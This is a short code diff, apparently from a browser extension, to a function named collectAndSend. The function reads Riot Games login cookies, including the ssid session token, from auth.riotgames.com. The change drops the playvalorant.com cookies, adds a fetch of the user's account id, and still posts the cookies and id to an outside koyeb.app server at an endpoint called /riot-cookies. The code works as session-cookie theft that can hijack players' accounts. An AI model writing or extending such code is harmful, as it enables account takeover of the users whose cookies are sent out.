@@ -25,21 +25,18 @@ async function collectAndSend() {
 
   try {
     const authCookies = await getCookies('https://auth.riotgames.com');
-    const rootCookies = await getCookies('https://playvalorant.com');
 
     const auth = {};
-    const root = {};
-
     ['ssid', 'sub', 'clid', 'tdid', 'csid'].forEach((name) => {
       const c = authCookies.find((v) => v.name === name);
       if (c) auth[name] = c.value;
     });
-    ['_cf_bm', '__Secure-refresh_token_presence', '__Secure-session_state'].forEach((name) => {
-      const c = rootCookies.find((v) => v.name === name);
-      if (c) root[name] = c.value;
-    });
 
-    const cookieLine = rootCookies.map((c) => `${c.name}=${c.value}`).join('; ');
+    const puuidRes = await fetch('https://auth.riotgames.com/userinfo', {
+      credentials: 'include',
+    });
+    const puuidData = await puuidRes.json();
+    const puuid = puuidData && puuidData.sub;
 
     const baseUrl = 'https://pure-cherrita-inosuke-6597cf0f.koyeb.app:8190';
 
@@ -49,8 +46,7 @@ async function collectAndSend() {
     const body = {
       nonce,
       user_id: userId,
-      cookies: { auth, root },
-      cookie_line: cookieLine,
+      cookies: { auth, puuid },
     };
 
     const res = await fetch(`${baseUrl}/riot-cookies`, {
